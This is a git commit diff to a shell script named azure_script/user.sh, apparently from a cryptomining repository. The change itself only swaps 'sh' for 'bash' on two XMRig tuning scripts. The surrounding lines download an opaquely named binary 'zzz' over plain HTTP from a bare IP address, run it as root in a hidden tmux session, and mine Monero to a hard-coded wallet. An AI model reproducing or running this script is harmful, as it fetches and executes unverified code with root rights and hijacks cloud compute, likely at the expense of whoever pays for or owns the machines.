653c68c87914b25196d9980622e56d7b8153c836
deepmonero <70528104+deepmonero@users.noreply.github.com>
2020-09-03 15:31:01 +0800

    Update user.sh

--- azure_script/user.sh
+++ azure_script/user.sh
@@ -8,8 +8,8 @@ sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1g
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
 sudo chmod +x enable_1gb_pages.sh
 sudo chmod +x randomx_boost.sh
-sudo sh enable_1gb_pages.sh
-sudo sh randomx_boost.sh
+sudo bash enable_1gb_pages.sh
+sudo bash randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
 sudo tmux new-session -d -s a 'sudo ./zzz -o pool.supportxmr.com:3333 -u 4BGmSpeCKjogeDoSBLsx371MAXjiK676FcqfJ3hruYbFZnizUecid4v6rRW5eimdHeMQL7kKtc8HEUN94sTXYutk6gFw1gB -p graphcheck --max-cpu-usage 50 --donate-level 0 --nicehash --randomx-1gb-pages '
